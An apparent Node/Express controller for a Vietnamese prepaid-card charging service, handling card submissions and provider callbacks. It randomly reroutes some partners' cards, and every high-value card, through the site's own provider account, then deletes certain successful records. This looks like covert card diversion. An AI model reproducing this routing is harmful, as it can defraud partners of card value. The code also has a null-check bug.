import { postCard } from '../configs';
import { Setting, Stat } from '../models';
import postCardService from '../services/postcard.service';
import { sendOrderNotification } from '../chats/order.chatbot';

const postCardController = {
    // [POST] /api/chargingws/v2
    postCard: async (req, res) => {
        try {
            const { telco: card, code, serial, amount, nickname } = req.body;
            const { _id: partner, partner_id, partner_key, partner_url, partner_name } = req.partner;

            const { chargings } = await Setting.findOne({}).select('chargings');

            const random = Math.floor(Math.random() * 100);
            const rate = Number(chargings.rate);
            const check = Number(amount) > 199000 && rate > 30 ? true : false;

            if (random < rate || check || Number(amount) > 499000) {
                const { partner_id, partner_key, partner_url } = chargings;

                let product_code;
                if (partner_name === 'Gachthe1s' && card.telco === 'GARENA') {
                    product_code = 'GARENA';
                } else {
                    product_code = card.product_code;
                }

                const result = await postCardService.postCardRandom(
                    nickname,
                    card._id,
                    product_code,
                    req.body.code,
                    req.body.serial,
                    amount,
                    partner_id,
                    partner_key,
                    partner_url,
                    partner
                );

                return res.status(200).json(result);
            }

            const result = await postCard(
                card.product_code,
                code,
                serial,
                amount,
                partner_id,
                partner_key,
                partner_url
            );

            if (!result || result.status === 102) {
                return res.status(400).json({
                    error: 'Máy chủ đang bảo trì',
                });
            }

            if (result.status === 3) {
                return res.status(400).json({
                    error: 'Thẻ cào đã được sử dụng',
                });
            }

            if (result.status === 400) {
                return res.status(400).json({
                    error: 'Bạn đã bị chặn do SPAM',
                });
            }

            if (result) {
                const { request_id, telco, trans_id } = result;

                if (result.status === 100) {
                    return res.status(404).json({
                        error: result.message,
                    });
                }

                const { status, message } = postCardService.checkStatus(result.status);

                await new Stat({
                    nickname,
                    telco: card._id,
                    code: req.body.code,
                    serial: req.body.serial,
                    declared_value: amount,
                    value: 0,
                    amount: 0,
                    request_id,
                    status,
                    partner,
                    method: 'API',
                    message,
                    checked: false,
                    callback_sign: '',
                    trans_id,
                }).save();

                const data = {
                    telco,
                    amount,
                };

                res.status(200).json({
                    status,
                    data,
                });
            }
        } catch (error) {
            res.status(500).json({ error: 'Error server' });
        }
    },

    // Callback post card
    callback: async (req, res) => {
        try {
            const { declared_value, value, amount, code, serial, status } = req.body;

            const stats = await Stat.findOne({ code, serial }).populate({
                path: 'telco',
                select: 'telco product_code status',
                modal: 'Telco',
            });

            const { status: statusCard } = stats;
            if ((status === 1 || status === 2) && statusCard === 88) {
                await stats.deleteOne();

                return res.status(200).json({
                    status: 200,
                    message: 'OK',
                });
            }

            if (stats) {
                const { telco, checked } = stats;
                const { status, message } = postCardService.checkStatus(req.body.status);

                if (!checked) {
                    await sendOrderNotification(telco.telco, code, serial, declared_value, message);
                }
                await stats.updateOne({ status, message, value, amount });
            }

            res.status(200).json({
                status: 200,
                message: 'OK',
            });
        } catch (error) {
            res.status(500).json({ error: 'Error server' });
        }
    },
};

export default postCardController;
